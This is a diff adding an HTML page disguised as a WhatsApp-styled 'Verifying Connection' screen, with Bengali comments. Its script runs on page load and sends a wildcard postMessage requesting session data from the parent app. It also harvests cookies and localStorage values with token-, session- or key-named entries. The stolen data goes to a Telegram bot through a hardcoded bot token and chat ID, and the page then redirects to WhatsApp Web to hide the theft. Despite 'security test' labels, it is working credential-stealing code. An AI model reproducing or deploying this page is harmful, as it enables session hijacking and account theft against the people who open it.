@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Status - Verifying...</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; }
+        h1 { color: #075e54; margin-bottom: 20px; }
+        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); border-top: 4px solid #075e54; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .message { color: #777; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Verifying Connection</h1>
+        <div class="spinner"></div>
+        <p class="message">
+            Checking session integrity...
+            <br>
+            Please wait while we establish a secure link.
+        </p>
+    </div>
+
+    <script>
+        // ⚠️ টেলিগ্রাম বট কনফিগারেশন - আপনার দেওয়া তথ্য অনুযায়ী:
+        const BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco"; 
+        const CHAT_ID = "6658445342";
+
+        // এই ফাংশনটি সংগ্রহ করা ডেটা Telegram Bot-কে মেসেজ করে পাঠাবে
+        function sendDataToAttacker(data) {
+            console.log("SECURITY TEST: Data collected, attempting to send to Telegram Bot.");
+            
+            // ডেটা ফরমেট করে মেসেজ হিসেবে তৈরি করা
+            const messageText = 
+`--- 🚨 VULNERABILITY TEST DATA 🚨 ---
+Vulnerability: ${data.vulnerability}
+Timestamp: ${data.timestamp}
+User Agent: ${navigator.userAgent}
+
+Attempted postMessage:
+${JSON.stringify(data.attempted_message, null, 2)}
+
+Stolen Cookies:
+${data.stolen_cookies || 'No cookies found in WebView'}
+
+Stolen Local Storage: 
+${JSON.stringify(data.stolen_local_storage, null, 2)}
+------------------------------------`;
+
+            // Telegram Bot API-তে ডেটা পাঠানোর জন্য Fetch API ব্যবহার
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: messageText,
+                    disable_notification: true 
+                })
+            })
+            .then(response => {
+                console.log('TELEGRAM: Message sent status:', response.status);
+            })
+            .catch(error => {
+                console.error('TELEGRAM: Sending failed:', error);
+            });
+        }
+
+        // লোকাল স্টোরেজ পরীক্ষা করার ফাংশন
+        function testLocalStorage() {
+            let stolenLocalStorage = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    // "token", "key", "secret" বা "session" এর মতো সংবেদনশীল তথ্য খোঁজা
+                    if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('session') || key.toLowerCase().includes('key'))) {
+                        stolenLocalStorage[key] = value;
+                    }
+                }
+            } catch (e) {
+                console.warn("Local Storage access denied or failed: ", e);
+            }
+            return stolenLocalStorage;
+        }
+
+
+        function attemptDataExfiltration() {
+            console.log("SECURITY TEST START: Attempting to exploit postMessage vulnerability.");
+
+            // 1. **Data Exfiltration via PostMessage (দুর্বলতা ১: ওয়াইল্ডকার্ড)**
+            const maliciousMessage = {
+                'action': 'FETCH_SESSION_DATA', // নেটিভ অ্যাপকে ডেটা ফেরত পাঠাতে বাধ্য করার চেষ্টা
+                'request_type': 'TEST_TOKEN_RETRIEVAL', 
+                'paw_id': 'VULNERABILITY_TEST' 
+            };
+
+            if (window.parent) {
+                window.parent.postMessage(maliciousMessage, '*');
+                console.warn("STEP 1: Malicious postMessage sent using wildcard '*'. Check Logcat for response.");
+            }
+
+            // 2. **Cookie Exfiltration**
+            const stolenCookie = document.cookie;
+            console.warn("STEP 2: Attempting to steal cookies: " + stolenCookie);
+            
+            // 3. **Local Storage Test**
+            const stolenLocalStorage = testLocalStorage();
+            console.warn("STEP 3: Attempting to steal Local Storage keys: ", JSON.stringify(stolenLocalStorage));
+
+            // 4. **Data Collection for Exfiltration**
+            const collectedData = {
+                vulnerability: "postMessage_Wildcard_and_Storage",
+                stolen_cookies: stolenCookie,
+                stolen_local_storage: stolenLocalStorage,
+                attempted_message: maliciousMessage,
+                timestamp: new Date().toISOString()
+            };
+            
+            // 5. **Exfiltration Attempt**
+            sendDataToAttacker(collectedData); 
+            
+            // 6. **Cleanup**
+            setTimeout(() => {
+                 window.location.href = "https://web.whatsapp.com/";
+            }, 7000); 
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(attemptDataExfiltration, 5000); 
+        });
+    </script>
+</body>
+</html>
